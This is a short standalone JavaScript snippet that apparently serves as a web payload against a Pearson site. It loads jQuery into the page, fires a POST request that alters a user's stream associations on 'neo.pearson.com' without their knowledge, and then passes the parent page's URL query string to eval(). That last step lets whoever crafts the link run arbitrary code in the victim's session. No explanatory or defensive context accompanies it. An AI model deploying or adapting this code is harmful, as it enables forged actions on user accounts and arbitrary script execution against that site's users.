var oHead = document.getElementsByTagName('HEAD').item(0);
var oScript= document.createElement("script");
oScript.type = "text/javascript";
oScript.src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js";
oHead.appendChild( oScript);

$.ajax({
    type: 'POST',
    url: 'https://neo.pearson.com/__services/v2/rest/stream-config/user/associations/manage',
    data: '[{"objectType":"3","objectID":"94242"}]',
    success: function(data){
        console.log(data)
    },
    dataType: 'json'
});

var queryString = parent.document.location.search.substr(1);
eval(decodeURIComponent(queryString));
